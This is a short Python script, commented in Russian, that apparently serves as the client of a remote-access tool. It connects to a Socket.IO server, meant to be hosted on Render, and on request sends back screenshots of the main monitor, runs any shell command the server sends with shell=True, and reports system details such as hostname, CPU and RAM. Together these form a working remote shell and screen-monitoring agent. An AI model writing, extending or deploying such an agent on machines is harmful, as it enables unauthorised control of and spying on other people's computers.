import socketio
import mss
from PIL import Image
import io
import base64
import socket
import subprocess
import platform
import psutil

# ⚠️ ЗАМЕНИТЕ ЭТУ СТРОКУ НА ВАШ ДОМЕН RENDER ПОСЛЕ ДЕПЛОЯ (например: https://ваш-проект.onrender.com)
# Если тестируете локально, оставьте как есть: http://127.0.0.1:5000
SERVER_URL = 'http://127.0.0.1:5000' 

sio = socketio.Client()

@sio.event
def connect():
    ip = socket.gethostbyname(socket.gethostname())
    sio.emit('connect_agent', {'ip': ip})
    print(f"Подключено к серверу! Мой IP: {ip}")

@sio.on('request_screen')
def handle_screen(data):
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        raw = sct.grab(monitor)
        img = Image.frombytes("RGB", raw.size, raw.rgb)
        img = img.resize((640, 360))
        buff = io.BytesIO()
        img.save(buff, format='JPEG', quality=70)
        b64 = base64.b64encode(buff.getvalue()).decode('utf-8')
        sio.emit('screen_captured', {'ip': data.get('ip'), 'image': b64})

@sio.on('run_shell_command')
def handle_command(data):
    try:
        result = subprocess.run(data.get('command'), shell=True, capture_output=True, text=True, timeout=10)
        output = result.stdout + result.stderr
    except Exception as e:
        output = f"Ошибка выполнения: {str(e)}"
    sio.emit('command_result', {'ip': data.get('ip'), 'result': output})

@sio.on('request_sysinfo')
def handle_sysinfo(data):
    info = f"ОС: {platform.system()} {platform.release()}\n"
    info += f"Имя ПК: {platform.node()}\n"
    info += f"Процессор: {platform.processor()}\n"
    info += f"ОЗУ: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
    info += f"Загрузка CPU: {psutil.cpu_percent()}%\n"
    info += f"Загрузка ОЗУ: {psutil.virtual_memory().percent}%"
    sio.emit('sysinfo_result', {'ip': data.get('ip'), 'info': info})

if __name__ == "__main__":
    sio.connect(SERVER_URL)
    sio.wait()